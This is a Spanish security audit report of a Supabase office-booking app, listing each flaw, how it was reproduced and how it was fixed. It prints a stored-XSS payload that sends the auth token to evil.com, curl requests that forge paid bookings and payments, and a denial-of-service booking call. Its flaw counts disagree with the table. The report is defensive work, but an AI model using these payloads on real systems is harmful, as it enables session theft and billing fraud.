# Informe de seguridad

Auditoría ofensiva de la aplicación, hecha con permiso del dueño sobre su
propia instalación. Se atacó primero y se arregló después; cada fallo de
esta lista se **reprodujo** antes de taparlo, y hay una prueba automática
que lo vuelve a intentar (`supabase/pruebas-seguridad.sql`).

Resumen: **20 fallos** en dos pasadas. De los 14 de la primera, 5
permitían quedarse con oficinas gratis o cobrar de más, 3 rompían el
aislamiento entre empresas y 1 permitía ejecutar código en el navegador
de otra persona. La segunda pasada atacó los propios arreglos y encontró
6 más — cuatro de ellos introducidos por mí al corregir los primeros.

| # | Fallo | Gravedad | Estado |
|---|-------|----------|--------|
| 1 | XSS almacenado por URL `javascript:` | Crítica | Arreglado |
| 2 | Reserva autoconfirmada y con total en 0 | Crítica | Arreglado |
| 3 | Pago falso en estado «aprobado» | Crítica | Arreglado |
| 4 | Factura por el importe que quisieras | Alta | Arreglado |
| 5 | `es_staff()` cruzaba empresas | Crítica | Arreglado |
| 6 | Bloqueo permanente de un espacio (DoS) | Alta | Arreglado |
| 7 | Reseñas firmadas como la administración | Media | Arreglado |
| 8 | Cupones canjeables infinitas veces | Media | Arreglado |
| 9 | Suplantar al soporte en el chat | Media | Arreglado |
| 10 | Sin CSP ni cabeceras de seguridad | Alta | Arreglado |
| 11 | Datos privados en la caché tras cerrar sesión | Alta | Arreglado |
| 12 | Falta índice único: los cobros no se registraban | Alta (bug) | Arreglado |
| 13 | Reembolso del 100 % moviendo la fecha | Media | Arreglado |
| 14 | Cancelar reservas de cuentas borradas | Baja | Arreglado |
| 15 | El número de tarjeta se quedaba en el DOM | Alta | Arreglado |
| 16 | Espacio «escondido» accesible por URL directa | Media | Arreglado |
| 17 | `urlMedioSegura()` bloqueaba lo que decía permitir | Baja (bug) | Arreglado |
| 18 | Ruta del plano sin validar | Baja | Arreglado |
| 19 | `adminGuardarEspacio` sin exportar: guardar reventaba | Alta (bug) | Arreglado |
| 20 | El tope de consultas podía duplicar conversaciones | Media (bug) | Arreglado |
| 21 | Las reservas se perdían al cerrar la pestaña | Alta (bug) | Arreglado |
| 22 | Carrera al leer el estado guardado | Alta (bug) | Arreglado |
| 23 | «Mis reservas» vacío con el servidor caído | Media (bug) | Arreglado |
| 24 | Reservar en el pasado / con 99 999 personas (sin servidor) | Media | Arreglado |
| 25 | Reservar un espacio inexistente | Media | Arreglado |
| 26 | Un bloque inventado facturaba 24 h | Media | Arreglado |
| 27 | Bloque que cruza medianoche daba duración negativa | Baja (bug) | Arreglado |
| 28 | El buscador devolvía el catálogo entero ante cualquier palabra | Media (bug) | Arreglado |

---

## 1. XSS almacenado — el peor de todos

**Dónde:** `js/views/espacio.js`, campo `tour_url` de un espacio.

Los textos sí se escapaban con `esc()`, pero escapar comillas **no sirve
de nada dentro de un `href`**. Un enlace puede llevar su propio lenguaje:

```
tour_url = javascript:fetch('https://evil.com?t='+localStorage.getItem('sb-…-auth-token'))
```

El navegador ejecuta eso al hacer clic. No hace falta ni una comilla ni un
`<script>`. Comprobado con un navegador real: el `alert` saltó.

**Impacto:** cualquiera con permiso para editar un espacio (staff) podía
robar la sesión de todo el que abriera esa oficina — incluida la del
administrador.

**Arreglo** (`js/core/utils.js`): además de escapar, ahora se **valida el
esquema** de toda URL que venga de la base de datos.

```js
const ESQUEMAS_SEGUROS = new Set(["http:", "https:", "mailto:", "tel:", "sms:", "blob:"]);
export function urlSegura(url) { … }   // devuelve "" si el esquema no está en la lista
export function urlMedioSegura(url) { … }  // igual, pero admite data:image/*
export function rutaInterna(destino) { … } // sólo rutas propias, nunca //otro-sitio.com
```

Aplicado en `espacio.js`, `pagos.js`, `asistente.js`, `componentes.js`,
`perfil.js`, `drawer.js`, `nosotros.js`, `login.js`, `admin/usuarios.js`
y `admin/espacio-editar.js`.

---

## 2–4, 7–9. El agujero de fondo: RLS dice *qué filas*, no *qué columnas*

Las políticas RLS estaban bien pensadas pero les faltaba la mitad del
trabajo. `reservas_update` decía «puedes actualizar tu reserva». No decía
**qué** de tu reserva. Y la llave pública de Supabase va dentro del
JavaScript, a la vista de cualquiera, así que no hace falta la app para
mandar peticiones:

```bash
curl -X PATCH "https://…supabase.co/rest/v1/reservas?id=eq.$MI_RESERVA" \
  -H "apikey: $LLAVE_PUBLICA" -H "Authorization: Bearer $MI_TOKEN" \
  -d '{"estado":"confirmada","total":0,"subtotal":0}'
```

Oficina confirmada, gratis. Y como dejar reseña exigía una reserva
confirmada, el mismo truco abría la puerta a inundar de reseñas.

Lo mismo pasaba con:

- **Pagos** (`pagos_insert`): `POST /pagos` con `{"estado":"aprobado","monto":0}`.
- **Facturas** (`facturas_insert`): importe, empresa y `estado:"timbrada"` a gusto.
- **Reseñas** (`resenas_update`): escribir la columna `respuesta`, que la
  interfaz pinta como *«Respuesta del centro de oficinas»*. Y mover
  `espacio_id` para pasar tus 5 estrellas a otra sala.
- **Chat** (`mensajes`): `{"es_staff":true}` y tu mensaje sale con la
  insignia del equipo de soporte.
- **Reseñas repetidas**: `reserva_id` podía ir en `null`, y en SQL dos
  `NULL` no son iguales, así que `UNIQUE(usuario_id, reserva_id)` no
  impedía nada. Una reserva daba reseñas infinitas.

**Arreglo** (`supabase/seguridad.sql`): triggers que revisan **columna por
columna** antes de escribir. Lo que el cliente no puede tocar se restaura
en silencio; lo que es directamente un abuso lanza error.

```sql
create trigger trg_guardia_reserva before update on public.reservas …
create trigger trg_guardia_pago    before insert or update on public.pagos …
create trigger trg_guardia_factura before insert or update on public.facturas …
create trigger trg_guardia_resena  before insert or update on public.resenas …
create trigger trg_guardia_mensaje before insert on public.mensajes …
```

Del estado de una reserva, el cliente sólo puede hacer un movimiento:
cancelar la suya. El importe de un pago se toma de la reserva. El de una
factura, del pago. El nombre del autor de una reseña, del perfil real.

### El sello de confianza

Las funciones del propio servidor (`crear_reserva`, `cancelar_reserva`,
`modificar_reserva`) sí necesitan escribir esas columnas. Dejan una marca
local a la transacción y la **apagan antes de devolver**:

```sql
perform set_config('app.rpc_confiable', '1', true);   -- al entrar
…
perform set_config('app.rpc_confiable', '0', true);   -- antes del return
```

Ningún cliente puede ponerla: PostgREST abre una transacción por petición
y no expone `set_config`. Las Edge Functions (webhooks de cobro, borrado
de cuenta, facturación) pasan por otra puerta, `es_servicio()`, que lee el
rol del JWT — y ese rol viene de la llave de servicio, que vive en los
secretos de Supabase, nunca en el navegador.

> Detalle que salió al probar: la primera versión dejaba el sello puesto
> hasta el final de la transacción. En producción daba igual (una
> transacción por petición), pero la prueba lo cazó y ahora se apaga solo.

---

## 5. `es_staff()` no distinguía empresas

```sql
-- Antes: esta mitad no miraba `p_org` para nada.
select exists (select 1 from public.usuarios u
                where u.id = auth.uid() and u.rol in ('staff','admin','superadmin'))
```

El administrador de la Empresa A era, a efectos prácticos, administrador
de todas. Leía reservas, pagos, facturas, conversaciones y perfiles de
cualquier otra empresa alojada en la misma base.

**Arreglo:** `usuarios` gana una columna `organizacion_id`, y el rol
global sólo vale dentro de esa organización. Sólo `superadmin` atraviesa
todas. Se corrigieron además las políticas que llamaban a `es_staff()`
sin argumento: catálogo, usuarios, reseñas, notificaciones, lista de
espera, auditoría y los buckets de Storage.

---

## 6. Bloquear una oficina para siempre con una sola petición

`crear_reserva()` aceptaba cualquier rango de fechas. Con

```sql
select crear_reserva('<espacio>', now(), now() + interval '300 years');
```

la restricción de exclusión que impide el doble booking pasaba a jugar en
contra: esa oficina quedaba ocupada hasta el año 2326. También se podían
crear reservas en el pasado, y meter 40 personas en una sala de 8.

**Arreglo:** `validar_ventana_reserva()` — la reserva tiene que estar en el
futuro, durar entre media hora y 24 h, caer dentro del año siguiente y
respetar el aforo. Además, un máximo de 10 reservas sin pagar a la vez
por persona, para que nadie acapare el edificio.

---

## 8. Cupones sin límite

`promociones.usos_por_usuario` existía en la tabla… y nadie la leía. El
mismo código de descuento se canjeaba una y otra vez. Además la política
`usos_insert` dejaba escribir directamente en `promocion_usos`.

**Arreglo:** `crear_reserva()` cuenta los canjes previos de esa persona y
bloquea el segundo; el `select` de la promoción va con `for update` para
cerrar la carrera sobre `usos_actuales`; y se eliminó la política que
permitía escribir usos desde el navegador.

---

## 10. Ni CSP, ni Referrer-Policy, ni protección contra clickjacking

`index.html` no traía ninguna cabecera de seguridad. Sin CSP, el XSS del
punto 1 no tenía ningún freno de emergencia.

**Arreglo:** CSP completa en `index.html` y `offline.html`, **sin
`unsafe-inline` en `script-src`**. Los scripts incrustados se autorizan
uno a uno por hash sha256:

```
node tools/csp.mjs           # recalcula los hashes
node tools/csp.mjs --check   # falla si están desfasados (para CI)
```

Se quitaron los `onclick=` que quedaban (`main.js`, `offline.html`) porque
`script-src-attr 'none'` los prohíbe. Se añadió `<meta name="referrer">` y,
como `frame-ancestors` no funciona dentro de un `<meta>`, un rompe-marcos
en JS.

**Cabeceras que hay que poner en el servidor** (no se pueden en `<meta>`):

```
Content-Security-Policy-Report-Only: …    (opcional, para vigilar)
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Permissions-Policy: geolocation=(self), camera=(), microphone=(), payment=(self)
Cross-Origin-Opener-Policy: same-origin
```

En Netlify van en `_headers`; en Vercel, en `vercel.json`; en Nginx, con
`add_header`.

---

## 11. Cerrar sesión no borraba nada

El service worker guardaba en disco **las respuestas autenticadas** de la
API (`co-datos-*`), y al cerrar sesión no se borraba ninguna caché. En un
equipo compartido, el siguiente en abrir el navegador podía recuperar
reservas, pagos y notificaciones de la persona anterior.

**Arreglo:**

- `sw.js` sólo cachea el **catálogo público** y sólo cuando la petición
  **no lleva sesión** (se lee el `sub` del JWT). Lista blanca de tablas: si
  mañana se añade una tabla con datos personales, por omisión no se
  cachea. Los archivos con URL firmada tampoco tocan el disco.
- `salir()` (`js/auth/auth.js`) ahora vacía IndexedDB, manda purgar las
  cachés del service worker y limpia `localStorage`/`sessionStorage`,
  conservando sólo lo neutro (tema, idioma, tutorial visto). La bandeja
  de salida de V1 sólo admite operaciones no críticas (favoritos); las
  reservas/cancelaciones antiguas que pudieran quedar de versiones previas
  se descartan y no se reenvían al recuperar red. Al borrar la cuenta se
  elimina también esa cola.
- `signOut()` va sin `scope`, así que **revoca el refresh token en el
  servidor**: si alguien te copió el token, deja de servirle.

El destino de las notificaciones push también se acota ahora a una ruta
interna, tanto en `sw.js` como en `pwa.js`.

---

## 12. Bug serio encontrado de paso: ningún cobro se registraba

`_compartido/utiles.ts` hace

```ts
await admin.from("pagos").upsert({ … }, { onConflict: "proveedor_id" });
```

pero `pagos.proveedor_id` **no tenía índice único**. Postgres responde
*«there is no unique or exclusion constraint matching the ON CONFLICT
specification»* y el webhook falla entero: el dinero entra en Stripe y la
reserva se queda sin confirmar.

**Arreglo:** `create unique index uq_pagos_proveedor on public.pagos
(proveedor_id) where proveedor_id is not null;`

---

## 13–14. Dos detalles con dinero de por medio

**13.** El reembolso se calculaba sobre `inicio - now()`. Con una reserva
para dentro de dos horas (50 % de reembolso), bastaba con moverla a la
semana siguiente y cancelarla acto seguido para cobrar el 100 %. Ahora
`modificar_reserva()` no deja mover nada dentro de las 24 h previas —la
misma ventana que la política de cancelación— y el reembolso se calcula
sobre **lo realmente pagado y no reembolsado**, no sobre el total teórico.

**14.** `if v.usuario_id <> auth.uid()` daba `NULL` cuando `usuario_id`
era `NULL` (cuenta borrada), y un `if NULL` no entra. Cualquiera con
sesión podía cancelar reservas huérfanas. Ahora es `is distinct from`.

---

---

## Segunda pasada: atacando lo que se añadió después

Los arreglos también son código nuevo, y el código nuevo trae fallos
nuevos. Se volvió a atacar todo lo construido después del primer informe
(`tools/ataque-cliente.mjs`). Cuatro hallazgos, tres de ellos míos:

**15. El número de tarjeta se quedaba pintado en el DOM.**
El formulario borraba `input.value` al enviar… pero el número seguía
escrito en la tarjeta de colores de arriba, que es un elemento aparte.
Cualquier extensión del navegador, o un vistazo al inspector, lo veía.
Ahora se limpia el eco visual, se quitan los atributos `value` y el
formulario entero se elimina del DOM al terminar.

**16. Esconder un espacio era sólo cosmético.**
`Admin → Qué se ve` lo quitaba del catálogo, del buscador y del mapa,
pero `getEspacio()` seguía devolviéndolo: bastaba conocer el enlace
directo para verlo y reservarlo. Ahora la comprobación está también ahí.

> Aun así, esconder no es borrar: es una preferencia de la interfaz.
> Para retirar un espacio de verdad, ponlo inactivo desde
> **Admin → Espacios** (`activo = false` en la base), que es lo que
> respetan las políticas RLS del servidor.

**17. `urlMedioSegura()` rechazaba las imágenes que decía permitir.**
Delegaba primero en `urlSegura()`, que no admite el esquema `data:`, así
que ninguna imagen en línea llegaba a pintarse nunca. Corregido el orden.
De paso se quitó `svg+xml` de la lista: un SVG es un documento y puede
traer scripts dentro; como avatar no compensa.

**18. La ruta del plano no se validaba.**
`plano_url` viene de la base de datos o de los ajustes guardados, y se
pasaba tal cual a `TextureLoader`. Ahora pasa por `urlMedioSegura()`,
igual que cualquier otra URL de datos.

### Y dos fallos de funcionamiento que salieron al revisar

**19. `adminGuardarEspacio` no estaba en el `export default` de
`api.js`:** guardar un espacio desde el panel reventaba con
*"api.adminGuardarEspacio is not a function"*. Se añadió una
comprobación automática que compara, en todos los módulos, lo que se
exporta con lo que se usa; encontró éste y completó ocho módulos más.

**20. El tope de tiempo de las consultas podía duplicar conversaciones.**
`getConversacion()` hacía «búscala; si no está, créala». Con el tope
nuevo, una consulta agotada devolvía «no está» y creaba una segunda
conversación con la mitad de los mensajes. Ahora sólo crea si la
búsqueda respondió de verdad.

---

## Lo que se probó y NO era vulnerable

- Contaminación de prototipo (`__proto__`, `constructor.prototype`).
- XSS reflejado en el buscador y en los parámetros de la ruta.
- Redirección abierta: el enrutado por hash la neutraliza, y aun así
  `rutaInterna()` filtra los destinos.
- Inyección de HTML en nombres, notificaciones y comentarios: bien
  escapado con `esc()`.
- Doble reserva del mismo horario: la restricción de exclusión con
  `btree_gist` la impide en el motor, no en el cliente.
- Importe manipulado en el pago: las Edge Functions ya leían el total de
  la base de datos, nunca del navegador.
- El rol no se puede escalar desde los metadatos del registro:
  `manejar_nuevo_usuario()` no los copia.

---

## Cómo aplicarlo

```bash
psql "$DATABASE_URL" -f supabase/schema.sql
psql "$DATABASE_URL" -f supabase/policies.sql
psql "$DATABASE_URL" -f supabase/seguridad.sql     # ← nuevo
```

Los tres son idempotentes: se pueden volver a correr sin miedo.

## Cómo comprobar que sigue cerrado

```bash
psql "$DATABASE_URL" -f supabase/pruebas-seguridad.sql
```

Reproduce los 21 ataques y verifica además que el uso normal (reservar,
reprogramar, cancelar, pagar, facturar) sigue funcionando. Todo corre
dentro de una transacción con `rollback` al final: no deja rastro. Aun
así, córrelo contra una copia, no contra producción.

Y los del navegador (con la app servida en `:8099`):

```bash
node tools/ataque-cliente.mjs      # XSS, ajustes manipulados, tarjeta
node tools/prueba-datos.mjs        # concurrencia, entradas hostiles, fechas
node tools/prueba-interaccion.mjs  # clics, mapa 3D, formularios, teclado
node tools/prueba-reserva.mjs      # el recorrido completo de una reserva
node tools/prueba-flujos.mjs       # favoritos, espera, reseñas, tema, sin conexión
```

La cuarta pasada (flujos secundarios) terminó **sin hallazgos**: favoritos,
lista de espera, reseñas, deduplicación de notificaciones, los tres temas,
el cambio de idioma, las llamadas de administración y el catálogo sin
conexión respondieron todos como debían.

Salida esperada: **39 comprobaciones en verde** y

```
══════════════════════════════════════════════════════════════
  TODAS LAS PRUEBAS DE SEGURIDAD PASARON
══════════════════════════════════════════════════════════════
```

## Lo que queda pendiente (no es código, es configuración)

1. **Poner las cabeceras del servidor** de la sección 10.
2. **`ORIGEN_PERMITIDO`** en los secretos de Supabase: hoy el CORS de las
   Edge Functions cae en `*` si no está definido.
3. **Rotar la llave de servicio** si alguna vez estuvo en un repositorio.
4. **`enviar-recordatorios`** se despliega con `--no-verify-jwt`: ponle un
   secreto compartido en la cabecera y compruébalo dentro de la función,
   o cámbialo a un cron de Supabase con JWT.
5. **Activar la protección de contraseñas filtradas** en Supabase Auth
   (Authentication → Policies) y bajar la caducidad del enlace de
   recuperación a una hora.
